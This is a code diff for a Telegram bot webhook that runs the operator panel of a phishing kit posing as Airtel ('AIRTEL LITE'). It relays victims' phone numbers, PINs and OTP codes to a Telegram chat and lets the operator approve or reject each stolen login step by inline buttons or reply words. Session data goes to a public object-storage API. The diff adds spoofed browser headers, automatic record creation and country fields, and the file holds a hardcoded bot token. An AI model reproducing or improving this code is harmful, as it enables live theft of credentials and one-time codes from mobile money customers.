@@ -1,5 +1,11 @@
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8867971085:AAHFHldZq92uowOok2xZOrvN4HNX2DjQYj8';
 
+const FETCH_HEADERS = {
+  'Content-Type': 'application/json',
+  'Accept': 'application/json',
+  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+};
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -21,6 +27,7 @@ export default async function handler(req, res) {
   try {
     const update = req.body || {};
 
+    // 1. INLINE BUTTON CALLBACK QUERY
     if (update.callback_query) {
       const cq = update.callback_query;
       const callbackData = cq.data || '';
@@ -48,13 +55,19 @@ export default async function handler(req, res) {
       if (recordId) {
         // Fetch current cloud state from restful-api.dev
         let currentRecord = null;
+        let isExisting = false;
+
         try {
-          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`);
+          const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+            headers: FETCH_HEADERS,
+            cache: 'no-store',
+          });
           if (fetchRes.ok) {
             currentRecord = await fetchRes.json();
+            isExisting = true;
           }
         } catch (e) {
-          console.warn('Error fetching cloud record:', e);
+          console.warn('Error fetching cloud record in webhook:', e);
         }
 
         const data = currentRecord?.data || {};
@@ -75,19 +88,35 @@ export default async function handler(req, res) {
 
         // Persist updated state to cloud
         try {
-          await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
-            method: 'PUT',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              name: currentRecord?.name || recordId,
-              data,
-            }),
-          });
+          if (isExisting) {
+            await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+              method: 'PUT',
+              headers: FETCH_HEADERS,
+              body: JSON.stringify({
+                name: currentRecord?.name || recordId,
+                data,
+              }),
+            });
+          } else {
+            // Record did not exist, create a fresh record with this session name!
+            await fetch(`https://api.restful-api.dev/objects`, {
+              method: 'POST',
+              headers: FETCH_HEADERS,
+              body: JSON.stringify({
+                name: recordId,
+                data: {
+                  sessionId: recordId,
+                  ...data,
+                  lastUpdated: Date.now(),
+                },
+              }),
+            });
+          }
         } catch (e) {
-          console.warn('Error updating cloud record:', e);
+          console.warn('Error persisting cloud record in webhook:', e);
         }
 
-        // Answer Telegram callback query
+        // Answer Telegram callback query immediately
         let alertMsg = 'Action enregistrée';
         if (actionType === 'approve_login') alertMsg = '✅ Connexion validée ! Passage au code OTP.';
         if (actionType === 'reject_login') alertMsg = '❌ Connexion refusée (Code PIN ou numéro incorrect).';
@@ -107,7 +136,8 @@ export default async function handler(req, res) {
         // Update message text in Telegram
         if (msgId && chatId) {
           let updatedText = '';
-          const phone = data.phone || 'Inconnu';
+          const phone = data.fullPhone || data.phone || 'Inconnu';
+          const country = data.country || 'Airtel Africa';
           const planName = data.planName || 'Forfait Airtel Starlink';
           const planPrice = data.planPrice || '$1.49';
           const pin = data.pin || '****';
@@ -116,17 +146,19 @@ export default async function handler(req, res) {
           if (actionType === 'approve_login') {
             updatedText =
               `🔴 <b>AIRTEL LITE - CONNEXION CLIENT VALIDÉE</b>\n\n` +
-              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🌍 <b>Pays:</b> ${country}\n` +
+              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
               `🔑 <b>Code PIN:</b> <code>${pin}</code>\n` +
               `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
               `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
               `⏰ <b>Heure validation:</b> ${new Date().toLocaleTimeString('fr-FR')}\n\n` +
               `🟢 <b>STATUT: ✅ APPROUVÉ PAR L'ADMINISTRATEUR</b>\n` +
-              `<i>L'utilisateur est redirigé vers la saisie du code OTP.</i>`;
+              `<i>L'utilisateur accède actuellement à la saisie du code OTP.</i>`;
           } else if (actionType === 'reject_login') {
             updatedText =
               `🔴 <b>AIRTEL LITE - CONNEXION CLIENT REFUSÉE</b>\n\n` +
-              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🌍 <b>Pays:</b> ${country}\n` +
+              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
               `🔑 <b>Code PIN:</b> <code>${pin}</code>\n` +
               `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
               `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
@@ -136,7 +168,8 @@ export default async function handler(req, res) {
           } else if (actionType === 'approve_otp') {
             updatedText =
               `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP VALIDÉ</b>\n\n` +
-              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🌍 <b>Pays:</b> ${country}\n` +
+              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
               `🔢 <b>Code OTP:</b> <code>${otp}</code>\n` +
               `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
               `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
@@ -146,7 +179,8 @@ export default async function handler(req, res) {
           } else if (actionType === 'reject_otp') {
             updatedText =
               `🔐 <b>AIRTEL LITE - CODE DE VÉRIFICATION OTP REFUSÉ</b>\n\n` +
-              `👤 <b>Numéro:</b> <code>+243 ${phone}</code>\n` +
+              `🌍 <b>Pays:</b> ${country}\n` +
+              `👤 <b>Numéro:</b> <code>${phone}</code>\n` +
               `🔢 <b>Code OTP:</b> <code>${otp}</code>\n` +
               `📦 <b>Forfait:</b> ${planName} (${planPrice})\n` +
               `🆔 <b>Session:</b> <code>${recordId}</code>\n` +
@@ -167,12 +201,85 @@ export default async function handler(req, res) {
             }).catch((err) => console.warn('editMessageText error:', err));
           }
         }
+
+        return res.status(200).json({ ok: true });
+      }
+    }
+
+    // 2. TEXT MESSAGE REPLY TO BOT (e.g. Admin replying "ok", "valider", "rejeter")
+    if (update.message) {
+      const msg = update.message;
+      const text = (msg.text || '').toLowerCase().trim();
+      const replyTo = msg.reply_to_message;
+
+      if (replyTo && replyTo.text) {
+        const replyText = replyTo.text;
+        const sessionMatch = replyText.match(/ID Session:\s*([a-zA-Z0-9_-]+)/i);
+
+        if (sessionMatch && sessionMatch[1]) {
+          const recordId = sessionMatch[1];
+          let actionType = '';
+
+          if (['ok', 'oui', 'valider', 'yes', 'approve', 'bon'].includes(text)) {
+            actionType = replyText.includes('OTP') ? 'approve_otp' : 'approve_login';
+          } else if (['non', 'refuser', 'no', 'reject', 'faux', 'erreur'].includes(text)) {
+            actionType = replyText.includes('OTP') ? 'reject_otp' : 'reject_login';
+          }
+
+          if (actionType) {
+            let currentRecord = null;
+            let isExisting = false;
+            try {
+              const fetchRes = await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+                headers: FETCH_HEADERS,
+              });
+              if (fetchRes.ok) {
+                currentRecord = await fetchRes.json();
+                isExisting = true;
+              }
+            } catch {}
+
+            const data = currentRecord?.data || {};
+            if (actionType === 'approve_login') data.loginStatus = 'approved';
+            if (actionType === 'reject_login') data.loginStatus = 'rejected';
+            if (actionType === 'approve_otp') data.otpStatus = 'approved';
+            if (actionType === 'reject_otp') data.otpStatus = 'rejected';
+            data.lastUpdated = Date.now();
+
+            try {
+              if (isExisting) {
+                await fetch(`https://api.restful-api.dev/objects/${recordId}`, {
+                  method: 'PUT',
+                  headers: FETCH_HEADERS,
+                  body: JSON.stringify({ name: currentRecord?.name || recordId, data }),
+                });
+              } else {
+                await fetch(`https://api.restful-api.dev/objects`, {
+                  method: 'POST',
+                  headers: FETCH_HEADERS,
+                  body: JSON.stringify({ name: recordId, data: { sessionId: recordId, ...data } }),
+                });
+              }
+            } catch {}
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                chat_id: msg.chat.id,
+                text: actionType.includes('approve') ? `✅ Session <code>${recordId}</code> validée !` : `❌ Session <code>${recordId}</code> rejetée.`,
+                parse_mode: 'HTML',
+                reply_to_message_id: msg.message_id,
+              }),
+            }).catch(() => {});
+          }
+        }
       }
     }
 
     return res.status(200).json({ ok: true });
-  } catch (err) {
-    console.error('Error in Telegram Webhook:', err);
-    return res.status(200).json({ ok: true, error: err.message });
+  } catch (error) {
+    console.error('Webhook error:', error);
+    return res.status(200).json({ ok: true });
   }
 }
